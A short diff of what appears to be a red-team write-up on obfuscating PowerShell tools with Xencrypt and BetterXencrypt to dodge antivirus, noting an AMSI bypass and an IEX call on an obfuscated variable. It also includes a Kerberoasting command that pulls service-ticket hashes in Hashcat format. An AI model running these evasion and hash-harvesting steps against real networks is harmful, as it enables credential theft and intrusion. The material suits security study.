@@ -34,8 +34,6 @@ BetterXencrypt - [https://github.com/GetRektBoy724/BetterXencrypt](https://githu
 Better Xencrypt can be used in the same way but seems to be, well, slightly better in terms of encryption strength however it would still get caught if an AMSI bypass was not ran before hand so the actual advantages are minimal but here is the code in any case:
 
 
-
-
 For BetterXencrypt:
 Find-PotentiallyCrackableAccounts
 ```
@@ -176,11 +174,15 @@ IEX($stxgyuonot)
 ```
 
 
-For XenCrypt:
+Now run the scripts:
 
 ```
 Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher -Format Hashcat
 ```
+
+
+
+For XenCrypt:
 
 
 Here is the outcome of the file enueration scripts "Find-PotentiallyCrackableAccounts.ps1":
